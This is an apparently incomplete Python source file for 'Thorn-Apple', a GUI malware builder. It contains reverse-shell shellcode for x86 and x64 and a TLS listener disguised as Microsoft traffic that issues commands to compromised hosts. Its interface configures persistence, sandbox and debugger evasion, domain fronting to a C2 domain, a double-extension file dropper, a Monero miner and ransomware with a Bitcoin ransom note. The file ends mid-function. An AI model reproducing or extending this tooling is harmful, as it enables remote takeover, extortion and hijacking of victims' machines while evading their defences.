#!/usr/bin/env python3
import sys
import random
import binascii
import hashlib
import os
import socket
import base64
import struct
import pefile
import ctypes
import platform
import time
import threading
import ssl
import tempfile
import select
import json
import re
from Crypto.Cipher import AES, ChaCha20
from Crypto.Protocol.KDF import scrypt
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QLabel,
    QLineEdit, QComboBox, QPushButton, QTextEdit, QGroupBox, QTabWidget,
    QFileDialog, QCheckBox, QMessageBox, QSpinBox, QStatusBar, QProgressBar
)
from PyQt5.QtCore import Qt, QSize, QThread, pyqtSignal
from PyQt5.QtGui import QIcon, QFont, QTextCursor, QColor, QPixmap, QGuiApplication

# Constants
X86_REVERSE_SHELL = (
    "31c031db31c931d2b066b301516a016a0289e1cd8089c731c031dbb066"
    "b30368{custom_ip}6668{custom_port}666a0289e16a10515789e1cd80"
    "89fb31c9b102b03fcd804979f931c050682f2f7368682f62696e89e350"
    "5389e1b00bcd80"
)

X64_REVERSE_SHELL = (
    "4831c04831ff4831f64831d24d31c06a025f6a015e6a065a6a29580f05"
    "4989c04831f64d31d24152c604240266c7442402{custom_port}c74424"
    "04{custom_ip}4889e66a105a41505f6a2a580f054889c76a035e6a2158"
    "0f0548ffce79f64831d248bbff2f62696e2f736848c1eb08534889e748"
    "31c050574889e6b03b0f05"
)

# IPv6 shellcode (x64 only for now)
X64_IPV6_REVERSE_SHELL = (
    "4831c04831ff4831f64831d24d31c06a025f6a015e6a065a6a29580f05"
    "4989c04831f64d31d24152c604240266c7442402{custom_port}48b8"
    "{custom_ip}504889e66a105a41505f6a2a580f054889c76a035e6a2158"
    "0f0548ffce79f64831d248bbff2f62696e2f736848c1eb08534889e748"
    "31c050574889e6b03b0f05"
)

SSL_PORT = 443
HTTPS_SNI = "www.microsoft.com"  # Camouflage as Microsoft traffic

# Valid self-signed certificate for www.microsoft.com
SERVER_CERT = b"""-----BEGIN CERTIFICATE-----
MIIDazCCAlOgAwIBAgIURZx8l0Jk5Z0uYtYV5j3VzJ0m0jgwDQYJKoZIhvcNAQEL
BQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yNDA0MjIxMjI1NDJaFw0yNTA0
MjIxMjI5NDJaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEw
HwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggEiMA0GCSqGSIb3DQEB
AQUAA4IBDwAwggEKAoIBAQDZgD7bO3Wg9qS4Y1cR7e9wUj7d8e9xN1jM7gK5fJm
l9sQfC6dZ5kZ5mZ5nZ5oZ5pZ5qZ5rZ5sZ5tZ5uZ5vZ5wZ5xZ5yZ5zZ5A5BA5CA
5DA5EA5FA5GA5HA5IA5JA5KA5LA5MA5NA5OA5PA5QA5RA5SA5TA5UA5VA5WA5XA
5YAiQDeH2k9qS4Y1cR7e9wUj7d8e9xN1jM7gK5fJmJ8h3+0rQ7X8W1q6J7XkZ1v
Y8Y2aF7b3e2ww5qQ5qZ5hZ5jZ5kAiQDoD3ZO3Wg9qS4Y1cR7e9wUj7d8e9xN1jM
7gK5fJmJ8h3+0rQ7X8W1q6J7XkZ1vY8Y2aF7b3e2ww5qQ5qZ5hZ5jZ5kAiEA6ZA+
2zt1oPakuGNXEe3vcFI+3fHvcTdYzO4CuXyZifId/tI=
-----END CERTIFICATE-----"""

SERVER_KEY = b"""-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDZgD7bO3Wg9qS4
Y1cR7e9wUj7d8e9xN1jM7gK5fJmJ8h3+0rQ7X8W1q6J7XkZ1vY8Y2aF7b3e2w
w5qQ5qZ5hZ5jZ5kZ5mZ5nZ5oZ5pZ5qZ5rZ5sZ5tZ5uZ5vZ5wZ5xZ5yZ5zZ5A
5BA5CA5DA5EA5FA5GA5HA5IA5JA5KA5LA5MA5NA5OA5PA5QA5RA5SA5TA5UA5V
A5WA5XA5YAiQDeH2k9qS4Y1cR7e9wUj7d8e9xN1jM7gK5fJmJ8h3+0rQ7X8W1
q6J7XkZ1vY8Y2aF7b3e2ww5qQ5qZ5hZ5jZ5kAiQDoD3ZO3Wg9qS4Y1cR7e9wU
j7d8e9xN1jM7gK5fJmJ8h3+0rQ7X8W1q6J7XkZ1vY8Y2aF7b3e2ww5qQ5qZ5
hZ5jZ5kAiEA6ZA+2zt1oPakuGNXEe3vcFI+3fHvcTdYzO4CuXyZifId/tI=
-----END PRIVATE KEY-----"""

class ListenerThread(QThread):
    update_signal = pyqtSignal(str)
    connection_signal = pyqtSignal(str, int, int)
    status_signal = pyqtSignal(str)

    def __init__(self, port, ip_version, use_ssl=False):
        super().__init__()
        self.port = port
        self.ip_version = ip_version  # "IPv4", "IPv6", or "Dual"
        self.running = False
        self.client_socket = None
        self.use_ssl = use_ssl
        self.cert_file = None
        self.key_file = None

    def run(self):
        self.running = True
        try:
            # Handle dual-stack (IPv4 and IPv6)
            if self.ip_version == "Dual":
                self.server_socket = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
                self.server_socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
                bind_addr = '::'
                version_info = "IPv4/IPv6"
            elif self.ip_version == "IPv6":
                self.server_socket = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
                bind_addr = '::'
                version_info = "IPv6"
            else:  # IPv4
                self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                bind_addr = '0.0.0.0'
                version_info = "IPv4"
                
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((bind_addr, self.port))
            self.server_socket.listen(1)

            context = None
            if self.use_ssl:
                # Write cert/key to temp files
                self.cert_file = tempfile.NamedTemporaryFile(delete=False)
                self.key_file = tempfile.NamedTemporaryFile(delete=False)
                self.cert_file.write(SERVER_CERT)
                self.key_file.write(SERVER_KEY)
                self.cert_file.close()
                self.key_file.close()
                context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                context.load_cert_chain(certfile=self.cert_file.name, keyfile=self.key_file.name)
                context.set_alpn_protocols(['http/1.1'])
                context.set_ciphers('ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384')
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE

            self.update_signal.emit(f"[*] Listening on port {self.port} ({version_info}) {'(TLS enabled)' if self.use_ssl else ''}\n")
            while self.running:
                try:
                    client_socket, addr = self.server_socket.accept()
                    addr_ip = addr[0]
                    addr_port = addr[1]
                    
                    # For dual-stack, determine IP version
                    if self.ip_version == "Dual":
                        try:
                            # Check if it's an IPv4-mapped address
                            if '.' in addr_ip:
                                ip_version = 4
                            else:
                                ip_version = 6
                        except:
                            ip_version = 4
                    elif self.ip_version == "IPv6":
                        ip_version = 6
                    else:
                        ip_version = 4
                    
                    if self.use_ssl:
                        try:
                            client_socket = context.wrap_socket(
                                client_socket,
                                server_side=True,
                                server_hostname=HTTPS_SNI
                            )
                            client_socket.do_handshake()
                        except ssl.SSLError as e:
                            self.update_signal.emit(f"[!] SSL handshake failed: {str(e)}\n")
                            client_socket.close()
                            continue
                    self.client_socket = client_socket
                    self.connection_signal.emit(addr_ip, addr_port, ip_version)
                    self.update_signal.emit(f"[+] Connection established from {addr_ip}:{addr_port} (IPv{ip_version})\n")
                    while self.running:
                        ready, _, _ = select.select([self.client_socket], [], [], 0.5)
                        if ready:
                            data = self.client_socket.recv(4096)
                            if not data:
                                break
                            self.update_signal.emit(data.decode(errors="ignore"))
                except Exception as e:
                    if "WinError 10038" not in str(e) and "Bad file descriptor" not in str(e):  # Ignore socket closed errors
                        self.update_signal.emit(f"[!] Listener error: {str(e)}\n")
                    break
        finally:
            self.update_signal.emit("\n[!] Listener stopped")
            if self.cert_file:
                try: os.unlink(self.cert_file.name)
                except: pass
            if self.key_file:
                try: os.unlink(self.key_file.name)
                except: pass

    def stop(self):
        self.running = False
        if self.client_socket:
            try:
                self.client_socket.close()
            except:
                pass
        try:
            # Create a temporary connection to unblock accept()
            if self.ip_version == "IPv6" or self.ip_version == "Dual":
                temp_socket = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
                temp_socket.connect(('::1', self.port))
            else:
                temp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                temp_socket.connect(('127.0.0.1', self.port))
            temp_socket.close()
        except:
            pass

    def send_command(self, command):
        if self.client_socket:
            try:
                self.client_socket.sendall((command + '\n').encode())
                return True
            except Exception as e:
                self.update_signal.emit(f"[!] Send error: {str(e)}")
        return False


class ReverseShellGenerator(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Thorn-Apple: Advanced Payload Generator")
        self.setGeometry(100, 100, 1200, 900)
        self.setStyleSheet(self.get_stylesheet())
        
        # Payload storage
        self.generated_payload = None
        self.payload_type = None
        self.encrypted_shellcode = None
        self.key = None
        self.nonce = None
        self.sleep_time = 0

        # Listener state
        self.listener_thread = None
        self.listener_port = 4444

        # File dropper configuration
        self.file_dropper_path = ""
        self.file_dropper_filename = ""

        # Module configurations
        self.mining_config = {
            'pool_url': 'pool.supportxmr.com:5555',
            'wallet': '46tW2n7ejSM3yF6q2GjQZ1hq6E2WZ7QsWk7X7bUfqGJgYb7rLzZ7JQx7Y7bUfqGJgYb7rLzZ7JQx7Y',
            'password': 'x',
            'cpu_percent': 50,
            'idle_only': True,
            'light_mode': True
        }
        
        self.ransom_config = {
            'note': 'Your files have been encrypted!\nSend 0.5 BTC to bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq',
            'extensions': ['.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', '.jpg', '.png', '.txt'],
            'exclusions': ['windows', 'program files', 'programdata', 'appdata']
        }
        
        self.domain_fronting_config = {
            'enabled': False,
            'front_domain': 'cdn.microsoft.com',
            'real_domain': 'c2.thornapple.com'
        }

        # Setup UI
        self.init_ui()

        # Setup status bar
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.status_label = QLabel("Ready")
        self.status_bar.addWidget(self.status_label)

        # Progress bar for operations
        self.progress_bar = QProgressBar()
        self.progress_bar.setMaximumWidth(200)
        self.progress_bar.setVisible(False)
        self.status_bar.addPermanentWidget(self.progress_bar)

    def get_stylesheet(self):
        return """
            QMainWindow {
                background-color: #1e1e1e;
                color: #f0f0f0;
                font-family: 'Segoe UI', 'Arial', sans-serif;
            }
            QGroupBox {
                border: 1px solid #3a3a3a;
                border-radius: 8px;
                margin-top: 1ex;
                font-weight: bold;
                color: #e0e0e0;
                padding: 15px;
                background-color: #252525;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                subcontrol-position: top center;
                padding: 0 10px;
                background-color: #252525;
                color: #4a90e2;
                font-weight: bold;
            }
            QLabel {
                color: #cccccc;
                font-size: 11pt;
            }
            QLineEdit, QComboBox, QTextEdit, QSpinBox {
                background-color: #2d2d2d;
                color: #f0f0f0;
                border: 1px solid #3a3a3a;
                border-radius: 4px;
                padding: 8px;
                font-family: 'Consolas', 'Courier New', monospace;
                font-size: 10pt;
                selection-background-color: #4a90e2;
            }
            QPushButton {
                background-color: #3a3a3a;
                color: white;
                border: none;
                border-radius: 4px;
                padding: 10px 18px;
                font-weight: bold;
                min-width: 100px;
                font-size: 10pt;
            }
            QPushButton:hover {
                background-color: #4a4a4a;
            }
            QPushButton:pressed {
                background-color: #2a2a2a;
            }
            QPushButton:disabled {
                background-color: #282828;
                color: #777777;
            }
            QPushButton#generate {
                background-color: #4a90e2;
                color: white;
                font-size: 12pt;
                padding: 12px 24px;
            }
            QPushButton#generate:hover {
                background-color: #5aa0f2;
            }
            QTabWidget::pane {
                border: 1px solid #3a3a3a;
                background: #252525;
                border-radius: 8px;
            }
            QTabBar::tab {
                background: #2d2d2d;
                color: #cccccc;
                padding: 10px 25px;
                border-top-left-radius: 8px;
                border-top-right-radius: 8px;
                border: 1px solid #3a3a3a;
                margin-right: 2px;
                font-size: 10pt;
            }
            QTabBar::tab:selected {
                background: #3a3a3a;
                color: white;
                border-bottom-color: #3a3a3a;
            }
            QTabBar::tab:!selected {
                margin-top: 3px;
            }
            QCheckBox {
                color: #cccccc;
                spacing: 8px;
                font-size: 10pt;
            }
            QCheckBox::indicator {
                width: 18px;
                height: 18px;
            }
            QCheckBox::indicator:unchecked {
                border: 1px solid #5a5a5a;
                background: #2d2d2d;
            }
            QCheckBox::indicator:checked {
                border: 1px solid #5a5a5a;
                background: #4a90e2;
            }
            QProgressBar {
                border: 1px solid #3a3a3a;
                border-radius: 4px;
                text-align: center;
                background: #252525;
                height: 20px;
            }
            QProgressBar::chunk {
                background-color: #4a90e2;
                border-radius: 4px;
            }
            #terminal {
                background-color: #0a0a0a;
                color: #e0e0e0;
                border: 1px solid #3a3a3a;
                font-family: 'Consolas', 'Courier New', monospace;
                padding: 15px;
                font-size: 10pt;
                border-radius: 4px;
            }
            #output {
                background-color: #0a0a0a;
                color: #e0e0e0;
                border: 1px solid #3a3a3a;
                font-family: 'Consolas', 'Courier New', monospace;
                padding: 15px;
                font-size: 10pt;
                border-radius: 4px;
            }
            QHeaderView::section {
                background-color: #3a3a3a;
                color: white;
                padding: 4px;
                border: 1px solid #2d2d2d;
            }
            QScrollBar:vertical {
                border: none;
                background: #252525;
                width: 12px;
                margin: 0px;
            }
            QScrollBar::handle:vertical {
                background: #4a4a4a;
                min-height: 20px;
                border-radius: 6px;
            }
            QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {
                background: none;
            }
            QScrollBar::add-page:vertical, QScrollBar::sub-page:vertical {
                background: none;
            }
        """

    def init_ui(self):
        main_widget = QWidget()
        main_layout = QVBoxLayout()
        main_layout.setContentsMargins(20, 20, 20, 20)
        main_layout.setSpacing(20)

        # Header with logo and title
        header_layout = QHBoxLayout()
        title_label = QLabel("Thorn-Apple")
        title_label.setStyleSheet("""
            QLabel {
                font-size: 28pt;
                font-weight: bold;
                color: #4a90e2;
                padding: 10px 0;
            }
        """)
        header_layout.addWidget(title_label)
        header_layout.addStretch()
        
        # Add version label
        version_label = QLabel("v2.1")
        version_label.setStyleSheet("font-size: 12pt; color: #777;")
        header_layout.addWidget(version_label)
        
        main_layout.addLayout(header_layout)

        tabs = QTabWidget()
        tabs.setStyleSheet("QTabWidget::pane { border: none; }")
        config_tab = QWidget()
        modules_tab = QWidget()
        output_tab = QWidget()

        tabs.addTab(config_tab, "Configuration")
        tabs.addTab(modules_tab, "Modules")
        tabs.addTab(output_tab, "Output")

        # Configuration Tab
        config_layout = QVBoxLayout()
        config_layout.setSpacing(20)

        # Connection settings
        conn_group = QGroupBox("Connection Settings")
        conn_layout = QVBoxLayout()
        conn_layout.setSpacing(15)

        # IP version selection
        ip_version_layout = QHBoxLayout()
        ip_version_layout.addWidget(QLabel("IP Version:"))
        self.ip_version_combo = QComboBox()
        self.ip_version_combo.addItems(["IPv4", "IPv6"])
        ip_version_layout.addWidget(self.ip_version_combo)
        conn_layout.addLayout(ip_version_layout)

        lhost_layout = QHBoxLayout()
        lhost_layout.addWidget(QLabel("LHOST:"))
        self.lhost_input = QLineEdit("127.0.0.1")
        self.lhost_input.setPlaceholderText("Enter attacker IP")
        lhost_layout.addWidget(self.lhost_input)

        lport_layout = QHBoxLayout()
        lport_layout.addWidget(QLabel("LPORT:"))
        self.lport_input = QLineEdit("4444")
        self.lport_input.setPlaceholderText("Enter listener port")
        lport_layout.addWidget(self.lport_input)

        sleep_layout = QHBoxLayout()
        sleep_layout.addWidget(QLabel("Sleep Time (s):"))
        self.sleep_spin = QSpinBox()
        self.sleep_spin.setRange(0, 3600)
        self.sleep_spin.setValue(0)
        self.sleep_spin.setToolTip("Sleep time before payload execution (0 = random)")
        sleep_layout.addWidget(self.sleep_spin)

        # SSL/TLS Checkbox
        ssl_layout = QHBoxLayout()
        self.ssl_cb = QCheckBox("Use SSL/TLS (evade DPI)")
        ssl_layout.addWidget(self.ssl_cb)
        conn_layout.addLayout(lhost_layout)
        conn_layout.addLayout(lport_layout)
        conn_layout.addLayout(sleep_layout)
        conn_layout.addLayout(ssl_layout)
        conn_group.setLayout(conn_layout)

        # Payload settings
        payload_group = QGroupBox("Payload Settings")
        payload_layout = QVBoxLayout()
        payload_layout.setSpacing(15)

        # Architecture selection
        arch_layout = QHBoxLayout()
        arch_layout.addWidget(QLabel("Architecture:"))
        self.arch_combo = QComboBox()
        self.arch_combo.addItems(["x86", "x64"])
        arch_layout.addWidget(self.arch_combo)

        # Platform selection
        platform_layout = QHBoxLayout()
        platform_layout.addWidget(QLabel("Platform:"))
        self.platform_combo = QComboBox()
        self.platform_combo.addItems(["Windows", "Linux", "macOS"])
        platform_layout.addWidget(self.platform_combo)

        # Format selection
        format_layout = QHBoxLayout()
        format_layout.addWidget(QLabel("Format:"))
        self.format_combo = QComboBox()
        self.format_combo.addItems(["Python Loader", "EXE", "Shellcode"])
        format_layout.addWidget(self.format_combo)

        # Encryption selection
        enc_layout = QHBoxLayout()
        enc_layout.addWidget(QLabel("Encryption:"))
        self.encoder_combo = QComboBox()
        self.encoder_combo.addItems(["AES-256-GCM", "ChaCha20-Poly1305"])
        enc_layout.addWidget(self.encoder_combo)

        payload_layout.addLayout(arch_layout)
        payload_layout.addLayout(platform_layout)
        payload_layout.addLayout(format_layout)
        payload_layout.addLayout(enc_layout)
        payload_group.setLayout(payload_layout)

        # Advanced options
        adv_group = QGroupBox("Advanced Evasion")
        adv_layout = QVBoxLayout()
        self.obfuscate_cb = QCheckBox("Code Obfuscation (polymorphic)")
        self.antidebug_cb = QCheckBox("Anti-Debug Techniques")
        self.sandbox_cb = QCheckBox("Sandbox Evasion")
        adv_layout.addWidget(self.obfuscate_cb)
        adv_layout.addWidget(self.antidebug_cb)
        adv_layout.addWidget(self.sandbox_cb)
        adv_group.setLayout(adv_layout)

        config_layout.addWidget(conn_group)
        config_layout.addWidget(payload_group)
        config_layout.addWidget(adv_group)
        config_layout.addStretch(1)
        config_tab.setLayout(config_layout)

        # Modules Tab
        modules_layout = QVBoxLayout()
        modules_layout.setSpacing(20)
        modules_layout.setContentsMargins(10, 10, 10, 10)

        # Persistence modules
        persist_group = QGroupBox("Persistence Modules")
        persist_layout = QVBoxLayout()
        self.registry_cb = QCheckBox("Registry Modification")
        self.startup_cb = QCheckBox("Startup Folder")
        self.scheduled_task_cb = QCheckBox("Scheduled Task")
        self.service_cb = QCheckBox("System Service")
        persist_layout.addWidget(self.registry_cb)
        persist_layout.addWidget(self.startup_cb)
        persist_layout.addWidget(self.scheduled_task_cb)
        persist_layout.addWidget(self.service_cb)
        persist_group.setLayout(persist_layout)

        # File Dropper module
        dropper_group = QGroupBox("File Dropper")
        dropper_layout = QVBoxLayout()
        
        # File selection
        file_layout = QHBoxLayout()
        self.file_path_input = QLineEdit()
        self.file_path_input.setPlaceholderText("Select file to drop...")
        file_layout.addWidget(self.file_path_input)
        self.browse_btn = QPushButton("Browse...")
        self.browse_btn.clicked.connect(self.select_drop_file)
        self.browse_btn.setFixedWidth(100)
        file_layout.addWidget(self.browse_btn)
        dropper_layout.addLayout(file_layout)
        
        # Filename configuration
        filename_layout = QHBoxLayout()
        filename_layout.addWidget(QLabel("Target Filename:"))
        self.filename_input = QLineEdit("document.pdf.exe")
        filename_layout.addWidget(self.filename_input)
        dropper_layout.addLayout(filename_layout)
        
        # Execution options
        exec_layout = QHBoxLayout()
        self.admin_exec_cb = QCheckBox("Execute with Admin Rights (Windows)")
        self.browser_drop_cb = QCheckBox("Drop in Browser Downloads Folder")
        exec_layout.addWidget(self.admin_exec_cb)
        exec_layout.addWidget(self.browser_drop_cb)
        dropper_layout.addLayout(exec_layout)
        
        modules_layout.addWidget(dropper_group)
        dropper_group.setLayout(dropper_layout)

        # Domain Fronting group
        fronting_group = QGroupBox("Domain Fronting (C2 Evasion)")
        fronting_layout = QVBoxLayout()
        self.fronting_cb = QCheckBox("Enable Domain Fronting")
        fronting_layout.addWidget(self.fronting_cb)
        
        fronting_config = QHBoxLayout()
        fronting_config.addWidget(QLabel("Front Domain:"))
        self.front_domain_input = QLineEdit("cdn.microsoft.com")
        fronting_config.addWidget(self.front_domain_input)
        
        fronting_config.addWidget(QLabel("Real Domain:"))
        self.real_domain_input = QLineEdit("c2.thornapple.com")
        fronting_config.addWidget(self.real_domain_input)
        fronting_layout.addLayout(fronting_config)
        
        modules_layout.addWidget(fronting_group)
        fronting_group.setLayout(fronting_layout)

        # Cryptocurrency Miner group
        miner_group = QGroupBox("Cryptocurrency Miner (Monero)")
        miner_layout = QVBoxLayout()
        
        pool_layout = QHBoxLayout()
        pool_layout.addWidget(QLabel("Mining Pool:"))
        self.pool_input = QLineEdit(self.mining_config['pool_url'])
        self.pool_input.setPlaceholderText("pool.example.com:5555")
        pool_layout.addWidget(self.pool_input)
        miner_layout.addLayout(pool_layout)
        
        wallet_layout = QHBoxLayout()
        wallet_layout.addWidget(QLabel("Wallet Address:"))
        self.wallet_input = QLineEdit(self.mining_config['wallet'])
        self.wallet_input.setPlaceholderText("Enter your Monero wallet")
        wallet_layout.addWidget(self.wallet_input)
        miner_layout.addLayout(wallet_layout)
        
        cpu_layout = QHBoxLayout()
        cpu_layout.addWidget(QLabel("CPU Usage (%):"))
        self.cpu_spin = QSpinBox()
        self.cpu_spin.setRange(10, 100)
        self.cpu_spin.setValue(self.mining_config['cpu_percent'])
        cpu_layout.addWidget(self.cpu_spin)
        miner_layout.addLayout(cpu_layout)
        
        stealth_layout = QHBoxLayout()
        self.idle_mining_cb = QCheckBox("Mine only when idle")
        self.idle_mining_cb.setChecked(True)
        self.light_mode_cb = QCheckBox("Light mode (reduce CPU usage)")
        self.light_mode_cb.setChecked(True)
        stealth_layout.addWidget(self.idle_mining_cb)
        stealth_layout.addWidget(self.light_mode_cb)
        miner_layout.addLayout(stealth_layout)
        
        modules_layout.addWidget(miner_group)
        miner_group.setLayout(miner_layout)

        # Ransomware group
        ransomware_group = QGroupBox("Ransomware Module")
        ransom_layout = QVBoxLayout()
        
        note_layout = QHBoxLayout()
        note_layout.addWidget(QLabel("Ransom Note:"))
        self.note_input = QTextEdit()
        self.note_input.setMaximumHeight(80)
        self.note_input.setText(self.ransom_config['note'])
        note_layout.addWidget(self.note_input)
        ransom_layout.addLayout(note_layout)
        
        ext_layout = QHBoxLayout()
        ext_layout.addWidget(QLabel("Target Extensions:"))
        self.ext_input = QLineEdit(",".join(self.ransom_config['extensions']))
        ext_layout.addWidget(self.ext_input)
        ransom_layout.addLayout(ext_layout)
        
        excl_layout = QHBoxLayout()
        excl_layout.addWidget(QLabel("Excluded Folders:"))
        self.excl_input = QLineEdit(",".join(self.ransom_config['exclusions']))
        excl_layout.addWidget(self.excl_input)
        ransom_layout.addLayout(excl_layout)
        
        modules_layout.addWidget(ransomware_group)
        ransomware_group.setLayout(ransom_layout)

        modules_layout.addStretch(1)
        modules_tab.setLayout(modules_layout)

        # Output Tab
        output_layout = QVBoxLayout()
        output_layout.setSpacing(20)
        
        # Generate button
        self.generate_btn = QPushButton("Generate Advanced Payload")
        self.generate_btn.setObjectName("generate")
        self.generate_btn.setIcon(QIcon.fromTheme("document-new"))
        self.generate_btn.clicked.connect(self.generate_payload)
        output_layout.addWidget(self.generate_btn, alignment=Qt.AlignCenter)
        
        # Output group
        output_group = QGroupBox("Payload Generation Report")
        output_group_layout = QVBoxLayout()
        self.output_text = QTextEdit()
        self.output_text.setObjectName("output")
        self.output_text.setReadOnly(True)
        self.output_text.setFontFamily("Consolas")
        self.output_text.setFontPointSize(10)
        output_group_layout.addWidget(self.output_text)
        output_group.setLayout(output_group_layout)
        output_layout.addWidget(output_group)
        
        # Save button
        self.save_btn = QPushButton("Save Payload to File")
        self.save_btn.setIcon(QIcon.fromTheme("document-save"))
        self.save_btn.setEnabled(False)
        self.save_btn.clicked.connect(self.save_payload)
        output_layout.addWidget(self.save_btn)
        
        # Listener group
        listener_group = QGroupBox("Reverse Shell Listener")
        listener_layout = QVBoxLayout()
        
        # Listener controls
        listener_controls = QHBoxLayout()
        self.listener_port_input = QLineEdit("4444")
        self.listener_port_input.setFixedWidth(80)
        self.listener_port_input.setPlaceholderText("Port")
        listener_controls.addWidget(self.listener_port_input)
        
        # Listener IP version
        listener_controls.addWidget(QLabel("IP Ver:"))
        self.listener_ip_combo = QComboBox()
        self.listener_ip_combo.addItems(["IPv4", "IPv6", "Dual"])
        self.listener_ip_combo.setFixedWidth(80)
        listener_controls.addWidget(self.listener_ip_combo)
        
        self.start_listener_btn = QPushButton("Start Listener")
        self.start_listener_btn.setIcon(QIcon.fromTheme("media-playback-start"))
        self.start_listener_btn.clicked.connect(self.toggle_listener)
        listener_controls.addWidget(self.start_listener_btn)
        
        self.stop_listener_btn = QPushButton("Stop Listener")
        self.stop_listener_btn.setIcon(QIcon.fromTheme("media-playback-stop"))
        self.stop_listener_btn.setEnabled(False)
        self.stop_listener_btn.clicked.connect(self.stop_listener)
        listener_controls.addWidget(self.stop_listener_btn)
        
        listener_controls.addStretch()
        listener_layout.addLayout(listener_controls)
        
        # Terminal group
        terminal_group = QGroupBox("Terminal")
        terminal_layout = QVBoxLayout()
        self.terminal = QTextEdit()
        self.terminal.setObjectName("terminal")
        self.terminal.setReadOnly(False)
        self.terminal.setFontFamily("Consolas")
        self.terminal.setFontPointSize(10)
        terminal_layout.addWidget(self.terminal)
        
        # Command input
        command_layout = QHBoxLayout()
        self.command_input = QLineEdit()
        self.command_input.setPlaceholderText("Enter command...")
        self.command_input.returnPressed.connect(self.send_command)
        command_layout.addWidget(self.command_input)
        
        self.send_btn = QPushButton("Send")
        self.send_btn.clicked.connect(self.send_command)
        self.send_btn.setFixedWidth(100)
        command_layout.addWidget(self.send_btn)
        
        terminal_layout.addLayout(command_layout)
        terminal_group.setLayout(terminal_layout)
        
        listener_layout.addWidget(terminal_group)
        listener_group.setLayout(listener_layout)
        output_layout.addWidget(listener_group)
        
        output_tab.setLayout(output_layout)
        
        main_layout.addWidget(tabs)
        main_widget.setLayout(main_layout)
        self.setCentralWidget(main_widget)
        
    def select_drop_file(self):
        """Select a file to embed in the payload"""
        file_path, _ = QFileDialog.getOpenFileName(
            self,
            "Select File to Drop",
            "",
            "All Files (*)"
        )
        if file_path:
            self.file_path_input.setText(file_path)
            # Suggest a filename based on the selected file
            suggested_name = os.path.basename(file_path)
            # Append .exe if not already present
            if not suggested_name.lower().endswith('.exe'):
                suggested_name += ".exe"
            self.filename_input.setText(suggested_name)

    def toggle_listener(self):
        if self.listener_thread and self.listener_thread.isRunning():
            self.stop_listener()
            return
        try:
            port = int(self.listener_port_input.text())
            if port < 1 or port > 65535:
                QMessageBox.warning(self, "Invalid Port", "Port must be between 1 and 65535")
                return
            ip_version = self.listener_ip_combo.currentText()
            use_ssl = self.ssl_cb.isChecked()
            self.listener_thread = ListenerThread(port, ip_version, use_ssl)
            self.listener_thread.update_signal.connect(self.update_terminal)
            self.listener_thread.connection_signal.connect(self.handle_connection)
            self.listener_thread.status_signal.connect(self.update_status)
            self.listener_thread.start()
            self.start_listener_btn.setText("Stop Listener")
            self.stop_listener_btn.setEnabled(True)
            self.terminal.append(f"[*] Starting {ip_version} listener on port {port} {'(TLS enabled)' if use_ssl else ''}...")
        except Exception as e:
            self.terminal.append(f"[!] Error starting listener: {str(e)}")

    def stop_listener(self):
        if self.listener_thread and self.listener_thread.isRunning():
            self.listener_thread.stop()
            self.listener_thread.quit()
            self.listener_thread.wait(2000)
            self.start_listener_btn.setText("Start Listener")
            self.stop_listener_btn.setEnabled(False)
            self.terminal.append("[*] Listener stopped")

    def handle_connection(self, ip, port, version):
        self.terminal.append(f"\n[+] Connection from {ip}:{port} (IPv{version})")
        self.terminal.append("-" * 50)

    def update_terminal(self, text):
        self.terminal.moveCursor(QTextCursor.End)
        self.terminal.insertPlainText(text)
        self.terminal.moveCursor(QTextCursor.End)

    def update_status(self, text):
        self.status_label.setText(text)

    def send_command(self):
        if not self.listener_thread or not self.listener_thread.isRunning():
            self.terminal.append("[!] No active listener")
            return
        command = self.command_input.text().strip()
        if not command:
            return
        self.terminal.append(f"$ {command}")
        self.command_input.clear()
        if self.listener_thread.send_command(command):
            self.terminal.append("Command sent")
        else:
            self.terminal.append("[!] Failed to send command")

    def validate_inputs(self):
        """Validate all user inputs before payload generation"""
        errors = []
        
        ip_version = self.ip_version_combo.currentText()
        lhost = self.lhost_input.text()
        
        # Validate LHOST based on IP version
        if ip_version == "IPv4":
            try:
                socket.inet_pton(socket.AF_INET, lhost)
            except socket.error:
                errors.append("Invalid IPv4 address for LHOST")
        else:  # IPv6
            try:
                socket.inet_pton(socket.AF_INET6, lhost)
            except socket.error:
                errors.append("Invalid IPv6 address for LHOST")
        
        # Validate LPORT
        try:
            port = int(self.lport_input.text())
            if port < 1 or port > 65535:
                errors.append("LPORT must be between 1 and 65535")
        except ValueError:
            errors.append("LPORT must be a valid number")
            
        # Validate file dropper
        if self.file_path_input.text() and not os.path.exists(self.file_path_input.text()):
            errors.append("Selected file for dropper does not exist")
            
        # Validate mining config
        modules = self.get_selected_modules()
        if "MINER" in modules:
            if not self.pool_input.text():
                errors.append("Mining pool URL is required")
            if not self.wallet_input.text() or len(self.wallet_input.text()) < 90:
                errors.append("Invalid Monero wallet address")
                
        # Validate domain fronting
        if "DOMAIN_FRONTING" in modules:
